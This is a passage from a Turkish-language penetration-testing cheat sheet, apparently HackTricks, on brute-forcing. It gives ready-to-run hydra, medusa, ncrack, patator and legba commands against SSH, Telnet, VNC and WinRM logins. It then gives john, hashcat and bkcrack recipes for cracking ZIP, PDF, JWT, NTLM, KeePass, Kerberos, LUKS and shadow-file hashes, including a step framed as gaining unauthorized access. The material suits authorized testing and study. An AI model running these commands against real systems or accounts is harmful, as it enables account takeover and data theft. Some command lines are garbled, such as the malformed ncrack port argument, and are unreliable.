patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Zayıf SSH anahtarları / Debian tahmin edilebilir PRNG

Bazı sistemler, kriptografik materyal oluşturmak için kullanılan rastgele tohumda bilinen hatalara sahiptir. Bu, büyük ölçüde azaltılmış bir anahtar alanıyla sonuçlanabilir ve [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute force saldırısına maruz kalabilir. Önceden oluşturulmuş zayıf anahtar setleri de mevcuttur, örneğin [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)

STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj sıralama hizmetleriyle sorunsuz iletişim ve etkileşim sağlayan yaygın olarak kullanılan bir iletişim protokolüdür. Mesaj alışverişi yapmak ve çeşitli mesajlaşma işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet, ağ protokolüdür ve bir sunucuya uzaktan erişim sağlamak için kullanılır. Brute force saldırıları, genellikle zayıf şifrelerle korunan Telnet sunucularına karşı etkili bir saldırı yöntemidir. Saldırganlar, oturum açma ekranına erişmek için farklı şifre kombinasyonlarını deneyerek sisteme erişmeye çalışırlar. Bu saldırı türü, güvenlik açığı olan sistemlere karşı kullanılabilir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

---

Brute-forcing VNC involves trying all possible username and password combinations until a successful login is found. This can be done using tools like Hydra or Medusa. It is important to note that brute-forcing is illegal and unethical unless you have explicit permission to do so.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm, Windows Remote Management, Windows işletim sistemi üzerinde uzaktan yönetim sağlayan bir protokoldür. Winrm, Windows sunucuları üzerinde komut çalıştırmak, dosya transferi yapmak ve diğer yönetim görevlerini gerçekleştirmek için kullanılır. Winrm, genellikle brute force saldırılarına karşı savunmasız olabilir. Bu nedenle, güçlü ve karmaşık şifreler kullanarak Winrm güvenliğini artırmak önemlidir.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yerel

### Çevrimiçi kırma veritabanları

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 ve SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP ile/olmadan ve herhangi bir meydan okuma değeriyle)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 yakalamaları ve arşivler MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hash'ler)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash'ler)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hash'ler)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash kırmadan önce bunları kontrol edin.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bilinen metin zip saldırısı

Şifreli bir zip dosyasının içinde bulunan bir dosyanın **metnini (veya metnin bir kısmını) bilmelisiniz**. Şifreli bir zip içinde bulunan dosyaların **dosya adlarını ve dosyaların boyutunu kontrol edebilirsiniz** çalıştırarak: **`7z l encrypted.zip`**\
İndir [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sürümler sayfasından.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords from PDF files. Tools like `pdfcrack` and `pdf2john` can be used to extract the hash from a PDF file, which can then be cracked using tools like `John the Ripper` or `hashcat`. These tools use different techniques to guess the password by trying all possible combinations until the correct one is found. It is important to use strong and complex passwords to prevent successful brute-force attacks.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Sahibi Şifresi

PDF Sahibi şifresini kırmak için şu adrese bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM kırma
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting, bir hedefin Service Principal Name (SPN) özniteliğine sahip hesaplarını hedefleyen bir saldırı tekniğidir. Bu saldırıda, SPN'ye sahip hesapların hash değerleri çalınarak offline olarak kaba kuvvet saldırısıyla çözülmeye çalışılır. Bu saldırı genellikle Kerberos tabanlı ortamlarda gerçekleştirilir ve saldırganın hedefe erişim elde etmesine olanak tanır.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Şans Görüntüsü

#### Yöntem 1

Yükle: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Yöntem 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Başka bir Luks BF öğretici: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Özel Anahtarı
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### DPAPI Anahtarını Kırmak

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) adresini kullanın ve ardından john'u çalıştırın

### Open Office Şifre Korumalı Sütun

Eğer bir xlsx dosyasında bir şifre ile korunan bir sütun varsa, şu adımları izleyerek şifreyi kaldırabilirsiniz:

* **Google Drive'a yükleyin** ve şifre otomatik olarak kaldırılacaktır
* **Manuel olarak** kaldırmak için:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikaları
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Araçlar

**Hash örnekleri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Kelime Listeleri

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Kelime Listesi Oluşturma Araçları**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, tuş haritası ve rotalar ile gelişmiş klavye-tarama oluşturucusu.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutasyonu

_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat saldırıları

* **Kelime listesi saldırısı** (`-a 0`) kurallarla

**Hashcat**, zaten kurallar içeren bir klasörle birlikte gelir ancak [**burada başka ilginç kurallar bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Kelime listesi kombinasyonu** saldırısı

Hashcat ile **2 kelime listesi birleştirilebilir**.\
Eğer 1. liste **"hello"** kelimesini içeriyorsa ve ikinci liste **"world"** ve **"earth"** kelimelerini içeriyorsa. `helloworld` ve `helloearth` kelimeleri oluşturulacaktır.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Maske saldırısı** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Kelime listesi + Maske (`-a 6`) / Maske + Kelime listesi (`-a 7`) saldırısı
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat modları
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Forcing Linux Hashes

### Introduction

When it comes to cracking Linux hashes from the `/etc/shadow` file, brute force attacks are a common method used by hackers. This involves systematically checking all possible passwords until the correct one is found.

### Methodology

1. **Obtain the Hash**: First, you need to obtain the hash from the `/etc/shadow` file. This can be done by gaining access to the file through various means.

2. **Generate Password List**: Create a list of potential passwords to use in the brute force attack. This list can be generated using tools like `Crunch` or `Cewl`.

3. **Brute Force Attack**: Use a tool like `John the Ripper` or `Hashcat` to perform the brute force attack. These tools will systematically check each password in the list against the hash until a match is found.

4. **Crack the Hash**: Once the correct password is found, you can use it to log in to the target system and gain unauthorized access.

### Conclusion

Brute forcing Linux hashes from the `/etc/shadow` file can be a time-consuming process, but it is an effective method for hackers to gain access to a system. It is important for system administrators to use strong, complex passwords to mitigate the risk of brute force attacks.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

## Introduction

Brute force is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Windows hashes, brute force can be used to crack the LM and NTLM hashes of Windows user passwords.

## Tools

There are several tools available for performing brute force attacks on Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that supports a variety of hash types, including LM and NTLM hashes.
- **Hashcat**: Another powerful password cracking tool that can be used to crack Windows hashes.
- **CrackMapExec**: A post-exploitation tool that can be used to perform brute force attacks on Windows systems.

## Methodology

To crack Windows hashes using brute force, follow these general steps:

1. Obtain the hash: Retrieve the LM or NTLM hash of the Windows user password that you want to crack.
2. Choose a tool: Select a password cracking tool that supports cracking Windows hashes.
3. Configure the tool: Set up the tool with the hash and any other relevant parameters.
4. Start the brute force attack: Initiate the brute force attack using the selected tool.
5. Wait for the results: The tool will systematically try different password combinations until the correct one is found.
6. Access the cracked password: Once the tool successfully cracks the hash, you will have access to the Windows user's password.

## Conclusion

Brute force attacks can be an effective way to crack Windows hashes and recover user passwords. By using the right tools and following a systematic approach, you can increase your chances of successfully cracking Windows hashes using brute force.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Kaba Kuvvet Saldırısı

Kaba kuvvet saldırısı, şifrelenmiş verileri çözmek için kullanılan temel bir tekniktir. Bu saldırı türü, genellikle şifrelenmiş bir metin veya hash değeri üzerinde sürekli deneme yaparak doğru şifreyi bulmaya çalışır.

## Yaygın Uygulama Hash'lerini Kırmak

Kaba kuvvet saldırıları genellikle yaygın olarak kullanılan uygulama hash'lerini kırmak için kullanılır. Bu, saldırganın önceden belirlenmiş bir liste veya kelime dağarcığı üzerinde kaba kuvvet saldırısı yaparak hedeflenen hash değerini çözmeye çalıştığı anlamına gelir. Bu yöntem, genellikle zayıf şifrelerin veya basit parolaların kullanıldığı durumlarda etkili olabilir.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**]'i (https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen ve **iş akışlarını otomatikleştiren** kolayca oluşturun.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
